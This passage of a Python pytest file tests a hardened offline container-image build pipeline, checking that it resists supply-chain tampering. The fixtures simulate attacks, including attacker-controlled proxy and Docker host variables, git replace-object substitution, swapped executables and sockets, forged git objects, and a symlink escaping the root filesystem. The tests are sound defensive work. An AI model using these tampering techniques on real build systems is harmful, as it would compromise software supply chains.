    assert "TrustedRuntimeBuildClosureFactoryV2" in source
    assert "open_reviewed_local_execution" in source
    assert "--container-engine" not in source
    assert "subprocess" not in source


def _production_build_kwargs() -> dict[str, object]:
    return {
        "build_id": "fresh-1",
        "platform": "linux/arm64",
        "source_commit": COMMIT,
        "source_tree": TREE,
        "catalog_source_sha256": CATALOG_SHA256,
        "capability_catalog_digest": "9" * 64,
        "model_callable_tools": tuple(EXPECTED_TOOLS),
        "builder_dependencies": (),
        "build_arguments": {"SOURCE_DATE_EPOCH": "0"},
        "network_mode": "none",
        "no_cache": True,
        "pull": False,
        "source_date_epoch": 0,
    }


@contextmanager
def _reviewed_execution(tmp_path: Path, monkeypatch, *, real_git: bool = False):
    binaries: dict[str, tuple[str, str]] = {}
    for name in ("git", "docker", "buildx"):
        path = tmp_path / name
        payload = (
            b'#!/bin/sh\nexec /usr/bin/git "$@"\n'
            if name == "git" and real_git
            else f"reviewed-{name}-binary".encode()
        )
        path.write_bytes(payload)
        path.chmod(0o500)
        binaries[name] = (str(path), hashlib.sha256(payload).hexdigest())
    daemon = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    socket_root = Path(tempfile.mkdtemp(prefix="po-reviewed-", dir="/tmp"))
    daemon_path = socket_root / "docker.sock"
    daemon.bind(str(daemon_path))
    daemon_path.chmod(0o600)
    monkeypatch.setattr(image_production.platform, "system", lambda: "TestOS")
    monkeypatch.setattr(image_production.platform, "machine", lambda: "test64")
    monkeypatch.setattr(
        image_production,
        "_REVIEWED_PLATFORM_TOOLS",
        {
            ("TestOS", "test64"): image_production._ReviewedPlatformToolsV1(
                git_path=binaries["git"][0],
                git_sha256=binaries["git"][1],
                docker_path=binaries["docker"][0],
                docker_sha256=binaries["docker"][1],
                buildx_path=binaries["buildx"][0],
                buildx_sha256=binaries["buildx"][1],
                docker_socket=str(daemon_path),
            )
        },
    )
    try:
        with image_production.open_reviewed_local_execution() as execution:
            yield execution
    finally:
        daemon.close()
        daemon_path.unlink(missing_ok=True)
        socket_root.rmdir()


def test_reviewed_execution_scrubs_ambient_command_and_network_selection(
    tmp_path: Path,
    monkeypatch,
) -> None:
    for name in (
        "PATH",
        "DOCKER_HOST",
        "DOCKER_CONTEXT",
        "BUILDKIT_HOST",
        "BUILDX_BUILDER",
        "HTTP_PROXY",
        "HTTPS_PROXY",
        "ALL_PROXY",
        "NO_PROXY",
    ):
        monkeypatch.setenv(name, "attacker-controlled")
    calls: list[tuple[list[str], dict[str, str]]] = []

    def fake_run(command, **kwargs):
        calls.append(([str(value) for value in command], kwargs["env"]))
        return subprocess.CompletedProcess(command, 0, b"ok", b"")

    monkeypatch.setattr(image_production.subprocess, "run", fake_run)
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        execution.run_git(["--version"])
        execution.run_docker(["version"])
        execution.run_buildx(["version"])

    assert [Path(command[0]).name for command, _ in calls] == [
        "git",
        "docker",
        "buildx",
    ]
    for _, environment in calls:
        assert environment["PATH"] == "/usr/bin:/bin"
        assert environment["DOCKER_HOST"].startswith(
            "unix:///tmp/po-reviewed-"
        )
        assert environment["DOCKER_HOST"].endswith("/docker.sock")
        assert environment["GIT_NO_LAZY_FETCH"] == "1"
        assert environment["GIT_NO_REPLACE_OBJECTS"] == "1"
        assert all(
            name not in environment
            for name in (
                "DOCKER_CONTEXT",
                "BUILDKIT_HOST",
                "BUILDX_BUILDER",
                "HTTP_PROXY",
                "HTTPS_PROXY",
                "ALL_PROXY",
                "NO_PROXY",
            )
        )


def test_reviewed_execution_runs_root_owned_production_git_in_place(
    tmp_path: Path,
) -> None:
    key = (
        image_production.platform.system(),
        image_production.platform.machine(),
    )
    pinned = image_production._REVIEWED_PLATFORM_TOOLS.get(key)
    if pinned is None:
        pytest.skip("production local toolchain is not reviewed on this platform")
    assert pinned.git_path == (
        "/Library/Developer/CommandLineTools/usr/bin/git"
    )
    linked = subprocess.run(
        ["/usr/bin/otool", "-L", pinned.git_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )
    assert linked.returncode == 0, linked.stderr
    dependencies = [
        line.strip().split(b" ", 1)[0]
        for line in linked.stdout.splitlines()[1:]
        if line.startswith(b"\t")
    ]
    assert dependencies
    assert all(
        dependency.startswith((b"/usr/lib/", b"/System/Library/"))
        for dependency in dependencies
    )

    placeholders: dict[str, tuple[str, str]] = {}
    for name in ("docker", "buildx"):
        path = tmp_path / name
        payload = b"#!/bin/sh\nexit 0\n"
        path.write_bytes(payload)
        path.chmod(0o500)
        placeholders[name] = (
            str(path),
            hashlib.sha256(payload).hexdigest(),
        )
    daemon = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    socket_root = Path(
        tempfile.mkdtemp(prefix="po-actual-git-", dir="/tmp")
    )
    daemon_path = socket_root / "docker.sock"
    daemon.bind(str(daemon_path))
    daemon_path.chmod(0o600)
    config = replace(
        pinned,
        docker_path=placeholders["docker"][0],
        docker_sha256=placeholders["docker"][1],
        buildx_path=placeholders["buildx"][0],
        buildx_sha256=placeholders["buildx"][1],
        docker_socket=str(daemon_path),
    )
    try:
        with image_production.ReviewedLocalExecutionV1(
            config=config,
            account_home=str(tmp_path),
            _token=image_production._LOCAL_EXECUTION_TOKEN,
        ) as execution:
            assert execution._git.path == pinned.git_path
            completed = execution.run_git(["--version"])
            builtins = execution.run_git(["--list-cmds=builtins"])
    finally:
        daemon.close()
        daemon_path.unlink(missing_ok=True)
        socket_root.rmdir()

    assert completed.returncode == 0
    assert completed.stdout == b"git version 2.50.1 (Apple Git-155)\n"
    assert builtins.returncode == 0
    assert b"cat-file" in builtins.stdout.split()


def test_exact_git_export_ignores_replace_refs_and_repo_local_attributes(
    tmp_path: Path,
    monkeypatch,
) -> None:
    repository = tmp_path / "repository"
    repository.mkdir()

    def git(*arguments: str, input: bytes | None = None) -> bytes:
        completed = subprocess.run(
            ["/usr/bin/git", "-C", str(repository), *arguments],
            input=input,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
        assert completed.returncode == 0, completed.stderr.decode(
            "utf-8", errors="replace"
        )
        return completed.stdout

    git("init", "--quiet")
    git("config", "user.name", "Personal Operator Test")
    git("config", "user.email", "personal-operator@example.invalid")
    payload_path = repository / "bridge" / "payload.txt"
    payload_path.parent.mkdir()
    payload_path.write_bytes(b"exact-committed-payload")
    git("add", "bridge/payload.txt")
    git("commit", "--quiet", "-m", "exact payload")
    commit = git("rev-parse", "HEAD^{commit}").decode().strip()
    tree = git("rev-parse", "HEAD^{tree}").decode().strip()
    original_blob = git("rev-parse", "HEAD:bridge/payload.txt").decode().strip()
    replacement_blob = git(
        "hash-object", "-w", "--stdin", input=b"attacker replacement"
    ).decode().strip()
    git("replace", original_blob, replacement_blob)
    attributes = repository / ".git" / "info" / "attributes"
    attributes.write_text("bridge/payload.txt export-ignore\n")

    reviewed_root = tmp_path / "reviewed"
    reviewed_root.mkdir()
    with _reviewed_execution(
        reviewed_root, monkeypatch, real_git=True
    ) as execution:
        archives = (
            image_production.LocalGitObjectArchiveExporter(
                repository,
                execution=execution,
            ).export_archive(
                source_commit=commit,
                source_tree=tree,
                path="bridge",
            ),
            image_production.ProductionRuntimeGitObjectExporterV2(
                execution=execution,
                release_repository=repository,
                openclaw_repository=repository,
            ).export_runtime_source(
                component="bridge-node-modules",
                attempt=1,
                source_commit=commit,
                source_tree=tree,
            ),
        )

    for archive_payload in archives:
        with tarfile.open(
            fileobj=io.BytesIO(archive_payload), mode="r:"
        ) as archive:
            member = archive.getmember("bridge/payload.txt")
            reader = archive.extractfile(member)
            assert reader is not None
            assert reader.read() == b"exact-committed-payload"


@pytest.mark.parametrize("corrupt_object", ["commit", "tree"])
def test_exact_git_export_rehashes_raw_commit_and_tree_objects(
    corrupt_object: str,
) -> None:
    blob = b"attacker-selected-payload"
    blob_id = hashlib.sha1(
        b"blob " + str(len(blob)).encode("ascii") + b"\x00" + blob
    ).hexdigest()
    raw_tree = (
        b"100644 payload.txt\x00" + bytes.fromhex(blob_id)
    )
    actual_tree_id = hashlib.sha1(
        b"tree "
        + str(len(raw_tree)).encode("ascii")
        + b"\x00"
        + raw_tree
    ).hexdigest()
    source_tree = actual_tree_id if corrupt_object == "commit" else "b" * 40
    raw_commit = (
        f"tree {source_tree}\nauthor attacker\n\nsubstituted\n".encode()
    )
    actual_commit_id = hashlib.sha1(
        b"commit "
        + str(len(raw_commit)).encode("ascii")
        + b"\x00"
        + raw_commit
    ).hexdigest()
    source_commit = (
        "a" * 40 if corrupt_object == "commit" else actual_commit_id
    )
    objects = {
        source_commit: (b"commit", raw_commit),
        source_tree: (b"tree", raw_tree),
        blob_id: (b"blob", blob),
    }

    class CorruptObjectExecution:
        def run_git(self, arguments, *, input=None):
            if arguments[2:4] == ["rev-parse", "--verify"]:
                requested = (
                    source_tree
                    if arguments[4].endswith("^{tree}")
                    else source_commit
                )
                return subprocess.CompletedProcess(
                    arguments, 0, requested.encode() + b"\n", b""
                )
            if arguments[2:5] == ["ls-tree", "-rz", "--full-tree"]:
                inventory = (
                    f"100644 blob {blob_id}\tpayload.txt".encode()
                    + b"\x00"
                )
                return subprocess.CompletedProcess(
                    arguments, 0, inventory, b""
                )
            if arguments[2:4] == ["cat-file", "--batch"]:
                response = b""
                for raw_id in input.splitlines():
                    object_type, payload = objects[raw_id.decode()]
                    response += (
                        raw_id
                        + b" "
                        + object_type
                        + b" "
                        + str(len(payload)).encode("ascii")
                        + b"\n"
                        + payload
                        + b"\n"
                    )
                return subprocess.CompletedProcess(
                    arguments, 0, response, b""
                )
            raise AssertionError(arguments)

    with pytest.raises(ImagePublicationError, match="object identity"):
        image_production._exact_git_object_archive(
            execution=CorruptObjectExecution(),
            repository=Path("/synthetic/repository"),
            source_commit=source_commit,
            source_tree=source_tree,
            path_prefix=None,
        )


def test_reviewed_execution_rejects_replaced_executable_identity(
    tmp_path: Path,
    monkeypatch,
) -> None:
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        executable = Path(execution._git.path)
        executable.unlink()
        executable.write_bytes(b"attacker-substituted-git")
        executable.chmod(0o500)

        with pytest.raises(ImagePublicationError, match="identity changed"):
            execution.run_git(["--version"])


def test_reviewed_execution_rehashes_same_inode_before_dispatch(
    tmp_path: Path,
    monkeypatch,
) -> None:
    calls: list[list[str]] = []

    def fake_run(command, **kwargs):
        calls.append([str(value) for value in command])
        return subprocess.CompletedProcess(command, 0, b"ok", b"")

    monkeypatch.setattr(image_production.subprocess, "run", fake_run)
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        executable = Path(execution._docker.path)
        metadata = executable.stat()
        malicious = b"x" * metadata.st_size
        executable.chmod(0o700)
        executable.write_bytes(malicious)
        executable.chmod(stat.S_IMODE(metadata.st_mode))
        os.utime(
            executable,
            ns=(metadata.st_atime_ns, metadata.st_mtime_ns),
        )

        with pytest.raises(ImagePublicationError, match="bytes differ"):
            execution.run_docker(["version"])

    assert calls == []


def test_reviewed_execution_dispatches_private_reviewed_byte_copies(
    tmp_path: Path,
    monkeypatch,
) -> None:
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        tools = Path(execution._environment_root.name) / "tools"
        assert Path(execution._git.path).parent == tools
        assert Path(execution._docker.path).parent == tools
        assert Path(execution._buildx.path).parent == tools
        assert all(
            Path(executable.path).stat().st_mode & 0o777 == 0o500
            for executable in (
                execution._git,
                execution._docker,
                execution._buildx,
            )
        )


def test_reviewed_execution_rejects_replaced_local_socket_identity(
    tmp_path: Path,
    monkeypatch,
) -> None:
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        socket_path = Path(execution._socket_path)
        socket_path.unlink()
        replacement = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            replacement.bind(str(socket_path))
            socket_path.chmod(0o600)
            with pytest.raises(
                ImagePublicationError, match="socket identity differs"
            ):
                execution.run_docker(["version"])
        finally:
            replacement.close()


def test_production_adapters_take_only_reviewed_execution_capability(
    tmp_path: Path,
    monkeypatch,
) -> None:
    repository = tmp_path / "repository"
    repository.mkdir()
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        exporter = image_production.LocalGitObjectArchiveExporter(
            repository,
            execution=execution,
        )
        builder = image_production.OfflineBuildkitOciBuilder(
            execution=execution
        )
        image_production.OfflineContainerImageProbe(
            execution=execution,
            builder=builder,
        )
        assert exporter is not None

    with pytest.raises(TypeError):
        image_production.OfflineBuildkitOciBuilder(
            container_engine="docker"
        )


def _production_oci_archive() -> bytes:
    python_rootfs = image_production._normalized_rootfs_export(
        _base_export_tar(node=False)
    )
    result = _build_result(
        labels={
            "personal.operator.python-base-rootfs-sha256": hashlib.sha256(
                python_rootfs
            ).hexdigest(),
            "personal.operator.node-base-binary-sha256": hashlib.sha256(
                b"retained-node"
            ).hexdigest(),
        }
    )
    return image_production._canonical_oci_archive(
        manifest=result["manifest"],
        blobs=result["blobs"],
        reference="personal-operator-test:exact",
    )


def _base_export_tar(*, node: bool) -> bytes:
    files = (
        {"usr/local/bin/node": (b"retained-node", 0o755)}
        if node
        else {
            "usr/local/bin/python3": (b"retained-python", 0o755),
            "etc/ssl/certs/ca-certificates.crt": (b"retained-ca", 0o644),
        }
    )
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w", format=tarfile.USTAR_FORMAT) as archive:
        for name, (payload, mode) in sorted(files.items()):
            member = tarfile.TarInfo(name)
            member.size = len(payload)
            member.mode = mode
            member.uid = member.gid = member.mtime = 0
            archive.addfile(member, io.BytesIO(payload))
    return output.getvalue()


def _retained_base_fixture() -> image_production._RetainedLocalBasesV1:
    python_rootfs = image_production._normalized_rootfs_export(
        _base_export_tar(node=False)
    )
    return image_production._RetainedLocalBasesV1(
        python_rootfs=python_rootfs,
        python_rootfs_sha256=hashlib.sha256(python_rootfs).hexdigest(),
        node_binary=b"retained-node",
        node_binary_sha256=hashlib.sha256(b"retained-node").hexdigest(),
    )


@pytest.mark.parametrize(
    "reserved_path",
    ["bridge/base/python-rootfs.tar", "bridge/base/node"],
)
def test_generated_base_context_paths_cannot_come_from_git(
    reserved_path: str,
) -> None:
    archive = _tar(
        {
            "bridge/Dockerfile": b"FROM scratch\n",
            "bridge/.dockerignore": Path("bridge/.dockerignore").read_bytes(),
            reserved_path: b"attacker-controlled-base",
        }
    )

    with pytest.raises(ImagePublicationError, match="generated base"):
        image_production._docker_context(
            archive,
            bases=_retained_base_fixture(),
        )


def test_production_context_rejects_a_broadened_dockerignore() -> None:
    archive = _tar(
        {
            "bridge/Dockerfile": b"FROM scratch\n",
            "bridge/.dockerignore": b"**\n!base/**\n",
        }
    )

    with pytest.raises(ImagePublicationError, match="Dockerignore"):
        image_production._docker_context(
            archive,
            bases=_retained_base_fixture(),
        )


def _rootfs_link_tar(*, name: str, target: str) -> bytes:
    output = io.BytesIO()
    with tarfile.open(
        fileobj=output, mode="w", format=tarfile.USTAR_FORMAT
    ) as archive:
        member = tarfile.TarInfo(name)
        member.type = tarfile.SYMTYPE
        member.linkname = target
        member.mode = 0o777
        member.uid = member.gid = member.mtime = 0
        archive.addfile(member)
    return output.getvalue()


def test_local_base_normalization_accepts_contained_relative_links() -> None:
    normalized = image_production._normalized_rootfs_export(
        _rootfs_link_tar(
            name="usr/share/zoneinfo/US/Eastern",
            target="../America/New_York",
        )
    )

    with tarfile.open(fileobj=io.BytesIO(normalized), mode="r:") as archive:
        member = archive.getmember("usr/share/zoneinfo/US/Eastern")
        assert member.issym()
        assert member.linkname == "../America/New_York"


def test_local_base_normalization_rejects_links_escaping_root() -> None:
    with pytest.raises(ImagePublicationError, match="link is unsafe"):
        image_production._normalized_rootfs_export(
            _rootfs_link_tar(
                name="usr/bin/python3",
                target="../../../host-python",
            )
        )


def _base_config_id(image: str) -> str:
    return "sha256:" + (
        "d" * 64
        if image == image_publication.NODE_RUNTIME_BASE
        else "c" * 64
    )


def _image_inspect(image: str) -> bytes:
    repository, digest = image.split("@", 1)
    repository = repository.rsplit(":", 1)[0]
    return _json(
        [
            {
                "Id": _base_config_id(image),
                "RepoDigests": [repository + "@" + digest],
                "Os": "linux",
                "Architecture": "arm64",
            }
        ]
    )


def _container_inspect(
    *,
    container_id: str,
    image: str,
    name: str,
    status: str,
) -> bytes:
    image_id = _base_config_id(image) if "@" in image else image
    return _json(
        [
            {
                "Id": container_id,
                "Image": image_id,
                "Config": {"Image": image},
                "Name": "/" + name,
                "Platform": "linux",
                "State": {"Status": status},
            }
        ]
    )


def _replace_oci_files(
    payload: bytes,
    *,
    replacements: dict[str, bytes] | None = None,
    additions: dict[str, bytes] | None = None,
) -> bytes:
    with tarfile.open(fileobj=io.BytesIO(payload), mode="r:") as archive:
        files = {
            member.name: archive.extractfile(member).read()
            for member in archive.getmembers()
            if member.isreg()
        }
    files.update(replacements or {})
    files.update(additions or {})
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w", format=tarfile.USTAR_FORMAT) as archive:
        for name, data in sorted(files.items()):
            member = tarfile.TarInfo(name)
            member.size = len(data)
            member.mode = 0o644
            member.uid = member.gid = member.mtime = 0
            archive.addfile(member, io.BytesIO(data))
    return output.getvalue()


def test_production_oci_parser_rejects_malformed_layers_and_unreferenced_blobs() -> None:
    archive = _production_oci_archive()
    parsed = image_production._oci_result_from_archive(archive)
    manifest = json.loads(parsed["manifest"])
    manifest["layers"] = None
    malformed_manifest = _json(manifest)
    malformed = image_production._canonical_oci_archive(
        manifest=malformed_manifest,
        blobs=parsed["blobs"],
        reference="personal-operator-test:malformed",
    )
    with pytest.raises(ImagePublicationError, match="descriptor inventory"):
        image_production._oci_result_from_archive(malformed)

    extra = b"unreferenced"
    with pytest.raises(ImagePublicationError, match="unreferenced"):
        image_production._oci_result_from_archive(
            _replace_oci_files(
                archive,
                additions={"blobs/sha256/" + hashlib.sha256(extra).hexdigest(): extra},
            )
        )


def test_production_builder_consumes_exact_context_and_exports_valid_oci(
    tmp_path: Path,
    monkeypatch,
) -> None:
    calls: list[tuple[list[str], bytes | None, dict[str, str]]] = []
    oci_archive = _production_oci_archive()
    containers: dict[str, tuple[str, str]] = {}

    def fake_run(command, **kwargs):
        command = [str(value) for value in command]
        calls.append((command, kwargs.get("input"), kwargs["env"]))
        arguments = command[1:]
        if Path(command[0]).name == "docker":
            if arguments[:2] == ["image", "inspect"]:
                return subprocess.CompletedProcess(
                    command, 0, _image_inspect(arguments[2]), b""
                )
            if arguments[0] == "create":
                image = arguments[-2]
                container_id = (
                    "b" * 64
                    if image == image_publication.NODE_RUNTIME_BASE
                    else "a" * 64
                )
                containers[container_id] = (
                    arguments[arguments.index("--name") + 1],
                    image,
                )
                return subprocess.CompletedProcess(
                    command, 0, (container_id + "\n").encode(), b""
                )
            if arguments[:2] == ["container", "inspect"]:
                container_id = arguments[2]
                name, image = containers[container_id]
                return subprocess.CompletedProcess(
                    command,
                    0,
                    _container_inspect(
                        container_id=container_id,
                        image=image,
                        name=name,
                        status="created",
                    ),
                    b"",
                )
            if arguments[0] == "export":
                _, image = containers[arguments[1]]
                return subprocess.CompletedProcess(
                    command,
                    0,
                    _base_export_tar(
                        node=image == image_publication.NODE_RUNTIME_BASE
                    ),
                    b"",
                )
            return subprocess.CompletedProcess(command, 0, b"", b"")
        output = arguments[arguments.index("--output") + 1]
        destination = Path(
            next(part.removeprefix("dest=") for part in output.split(",") if part.startswith("dest="))
        )
        destination.write_bytes(oci_archive)
        return subprocess.CompletedProcess(command, 0, b"", b"")

    monkeypatch.setattr(image_production.subprocess, "run", fake_run)
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        builder = image_production.OfflineBuildkitOciBuilder(
            execution=execution
        )
        result = builder.build(_tar(), **_production_build_kwargs())

    assert result["schema"] == "personal-operator.oci-build-result.v2"
    docker_calls = [call for call in calls if Path(call[0][0]).name == "docker"]
    assert len([call for call in docker_calls if call[0][1] == "create"]) == 2
    assert all(
        "--pull=never" in call[0] and "--network=none" in call[0]
        for call in docker_calls
        if call[0][1] == "create"
    )
    buildx_calls = [call for call in calls if Path(call[0][0]).name == "buildx"]
    assert len(buildx_calls) == 1
    command, context, environment = buildx_calls[0]
    for flag in (
        "--platform=linux/arm64",
        "--network=none",
        "--pull=false",
        "--no-cache",
        "--provenance=false",
        "--sbom=false",
    ):
        assert flag in command
    assert command[-1] == "-"
    assert environment["DOCKER_HOST"].startswith("unix:///tmp/po-reviewed-")
    with tarfile.open(fileobj=io.BytesIO(context), mode="r:") as archive:
        names = archive.getnames()
        dockerfile = archive.extractfile("Dockerfile").read()
    assert "Dockerfile" in names
    assert "bridge/Dockerfile" not in names
    assert "base/python-rootfs.tar" in names
    assert "base/node" in names
    assert [
        line for line in dockerfile.splitlines() if line.startswith(b"FROM ")
    ] == [b"FROM scratch"]


def test_local_base_export_binds_returned_container_to_pinned_image(
    tmp_path: Path,
    monkeypatch,
) -> None:
    calls: list[list[str]] = []

    def fake_run(command, **kwargs):
        command = [str(value) for value in command]
        arguments = command[1:]
        calls.append(arguments)
        if arguments[:2] == ["image", "inspect"]:
            return subprocess.CompletedProcess(
                command, 0, _image_inspect(arguments[2]), b""
            )
        if arguments[0] == "create":
            return subprocess.CompletedProcess(command, 0, b"a" * 64 + b"\n", b"")
        if arguments[:2] == ["container", "inspect"]:
            return subprocess.CompletedProcess(
                command,
                0,
                _json(
                    [
                        {
                            "Id": "a" * 64,
                            "Image": "sha256:" + "f" * 64,
                            "Config": {
                                "Image": image_publication.PYTHON_RUNTIME_BASE
                            },
                            "Name": "/expected",
                            "Platform": "linux",
                        }
                    ]
                ),
                b"",
            )
        if arguments[0] == "export":
            return subprocess.CompletedProcess(
                command, 0, _base_export_tar(node=False), b""
            )
        return subprocess.CompletedProcess(command, 0, b"", b"")

    monkeypatch.setattr(image_production.subprocess, "run", fake_run)
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        with pytest.raises(ImagePublicationError, match="container identity"):
            image_production._retain_local_base(
                execution,
                component="python",
                image=image_publication.PYTHON_RUNTIME_BASE,
            )

    assert not any(arguments[0] == "export" for arguments in calls)


def test_production_probe_is_coupled_to_builder_and_uses_closed_runtime_flags(
    tmp_path: Path,
    monkeypatch,
) -> None:
    oci_archive = _production_oci_archive()
    expected_image_id = image_publication._validate_oci_build(
        image_production._oci_result_from_archive(oci_archive)
    ).config_descriptor.digest
    commands: list[list[str]] = []
    containers: dict[str, tuple[str, str, str]] = {}

    def fake_execution(command, **kwargs):
        command = [str(value) for value in command]
        arguments = command[1:]
        if Path(command[0]).name == "buildx":
            output = arguments[arguments.index("--output") + 1]
            destination = Path(
                next(
                    part.removeprefix("dest=")
                    for part in output.split(",")
                    if part.startswith("dest=")
                )
            )
            destination.write_bytes(oci_archive)
            return subprocess.CompletedProcess(command, 0, b"", b"")
        if arguments[:2] == ["image", "inspect"]:
            if "@" not in arguments[2]:
                return subprocess.CompletedProcess(
                    command,
                    0,
                    _json(
                        [
                            {
                                "Id": expected_image_id,
                                "RepoTags": [arguments[2]],
                                "Os": "linux",
                                "Architecture": "arm64",
                            }
                        ]
                    ),
                    b"",
                )
            return subprocess.CompletedProcess(
                command, 0, _image_inspect(arguments[2]), b""
            )
        if arguments[0] == "create":
            image = arguments[-2]
            container_id = (
                "b" * 64
                if image == image_publication.NODE_RUNTIME_BASE
                else "a" * 64
            )
            containers[container_id] = (
                arguments[arguments.index("--name") + 1],
                image,
                "created",
            )
            return subprocess.CompletedProcess(
                command, 0, (container_id + "\n").encode(), b""
            )
        if arguments[0] == "run":
            container_id = "c" * 64
            containers[container_id] = (
                arguments[arguments.index("--name") + 1],
                arguments[-1],
                "running",
            )
            commands.append(command)
            return subprocess.CompletedProcess(
                command, 0, (container_id + "\n").encode(), b""
            )
        if arguments[:2] == ["container", "inspect"]:
            container_id = arguments[2]
            name, image, status = containers[container_id]
            return subprocess.CompletedProcess(
                command,
                0,
                _container_inspect(
                    container_id=container_id,
                    image=image,
                    name=name,
                    status=status,
                ),
                b"",
            )
        if arguments[0] == "export":
            _, image, _ = containers[arguments[1]]
            return subprocess.CompletedProcess(
                command,
                0,
                _base_export_tar(
                    node=image == image_publication.NODE_RUNTIME_BASE
                ),
                b"",
            )
        commands.append(command)
        joined = " ".join(command)
        if "urlopen" in joined:
            stdout = b'{"status":"Healthy"}\n'
        elif "/app/capabilities/release-v1.json" in joined:
            stdout = _json(
                {
                    "schema": "personal-operator.capability-release.v1",
                    "releaseCommit": COMMIT,
                    "catalogDigest": "9" * 64,
                }
            ) + b"\n"
        elif "loadRuntimeCapabilityRelease" in joined:
            stdout = _json(EXPECTED_TOOLS)
        elif command[-1] == "env":
            stdout = b"AWS_REGION=eu-west-1\n"
        else:
            stdout = b""
        return subprocess.CompletedProcess(command, 0, stdout, b"")

    monkeypatch.setattr(image_production.subprocess, "run", fake_execution)
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        builder = image_production.OfflineBuildkitOciBuilder(
            execution=execution
        )
        result = builder.build(_tar(), **_production_build_kwargs())
        probe = image_production.OfflineContainerImageProbe(
            execution=execution,
            builder=builder,
        )
        evidence = probe.run(
            manifest=result["manifest"],
            blobs=result["blobs"],
            build_id="fresh-1",
            platform="linux/arm64",
            network_mode="none",
            credentials={},
            read_only_root=True,
        )

    assert evidence["startupStatus"] == "HEALTHY"
    start = next(command for command in commands if command[1] == "run")
    assert "--pull=never" in start
    assert "--network=none" in start
    assert "--read-only" in start
    assert "--cap-drop=ALL" in start
    assert "--security-opt=no-new-privileges" in start
    assert start[-1] == expected_image_id


def test_production_probe_rejects_crossed_container_before_exec(
    tmp_path: Path,
    monkeypatch,
) -> None:
    oci_archive = _production_oci_archive()
    result = image_production._oci_result_from_archive(oci_archive)
    image_id = image_publication._validate_oci_build(
        result
    ).config_descriptor.digest
    reference = "personal-operator-test:exact"
    container_id = "c" * 64
    commands: list[list[str]] = []

    def fake_run(command, **kwargs):
        command = [str(value) for value in command]
        arguments = command[1:]
        commands.append(arguments)
        if arguments[:2] == ["image", "load"]:
            return subprocess.CompletedProcess(command, 0, b"loaded\n", b"")
        if arguments[:2] == ["image", "inspect"]:
            return subprocess.CompletedProcess(
                command,
                0,
                _json(
                    [
                        {
                            "Id": image_id,
                            "RepoTags": [reference],
                            "Os": "linux",
                            "Architecture": "arm64",
                        }
                    ]
                ),
                b"",
            )
        if arguments[0] == "run":
            return subprocess.CompletedProcess(
                command, 0, (container_id + "\n").encode(), b""
            )
        if arguments[:2] == ["container", "inspect"]:
            name = next(
                call[call.index("--name") + 1]
                for call in commands
                if call[0] == "run"
            )
            return subprocess.CompletedProcess(
                command,
                0,
                _container_inspect(
                    container_id=container_id,
                    image="sha256:" + "f" * 64,
                    name=name,
                    status="running",
                ),
                b"",
            )
        return subprocess.CompletedProcess(command, 0, b"", b"")

    monkeypatch.setattr(image_production.subprocess, "run", fake_run)
    with _reviewed_execution(tmp_path, monkeypatch) as execution:
        builder = image_production.OfflineBuildkitOciBuilder(
            execution=execution
        )
        builder._built["fresh-1"] = image_production._BuiltImage(
            result=result,
            oci_archive=oci_archive,
            reference=reference,
            source_commit=COMMIT,
            catalog_sha256="9" * 64,
        )
        probe = image_production.OfflineContainerImageProbe(
            execution=execution,
            builder=builder,
        )
        with pytest.raises(ImagePublicationError, match="container identity"):
            probe.run(
                manifest=result["manifest"],
                blobs=result["blobs"],
                build_id="fresh-1",
                platform="linux/arm64",
                network_mode="none",
                credentials={},
                read_only_root=True,
            )

    assert not any(arguments[0] == "exec" for arguments in commands)
    assert ["rm", "--force", container_id] not in commands


def test_free_injected_test_protocols_cannot_mint_production_image_evidence() -> None:
    with pytest.raises(ImagePublicationError, match="concrete trusted adapters"):
        image_production.TrustedImageProducerV2(
            git_archive=FakeGitArchive(),
            builder=FakeBuilder(),
            probe=FakeProbe(),
        )
    source = Path("scripts/prepare-runtime-image-publication.py").read_text()
    assert "TrustedImageProducerV2" in source
    assert "TrustedRuntimeBuildClosureFactoryV2" in source
    assert "prepare_image_publication" not in source
    assert "load_reviewed_runtime_build_closure" not in source
    assert "--runtime-build-closure" not in source


def test_serialized_runtime_closure_cannot_be_promoted_into_production() -> None:
    closure = _prepare_closure(_trusted_runtime_provider()[0])
    assert not hasattr(
        image_production, "load_reviewed_runtime_build_closure"
    )
    with pytest.raises(
        RuntimeBuildClosureError, match="not constructible"
    ):
        image_production.TrustedRuntimeBuildClosureV2(closure=closure)


def test_production_command_materializes_plan_and_one_artifact_per_effect(
    tmp_path: Path,
) -> None:
    script = Path("scripts/prepare-runtime-image-publication.py").resolve()
    specification = importlib.util.spec_from_file_location(
        "prepare_runtime_image_publication_script", script
    )
    assert specification is not None and specification.loader is not None
    module = importlib.util.module_from_spec(specification)
    specification.loader.exec_module(module)
    bundle = _prepare()
    output = tmp_path / "image-publication"

    module._materialize(output, bundle)

    manifest = json.loads((output / "manifest.json").read_bytes())
    effects = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )
    assert manifest["publicationPlanSha256"] == bundle.plan_sha256
    assert len(list((output / "effects").iterdir())) == len(effects)
    assert ImagePublicationPlanV1.from_bytes(
        (output / "image-publication-plan.json").read_bytes()
    ) == bundle.plan
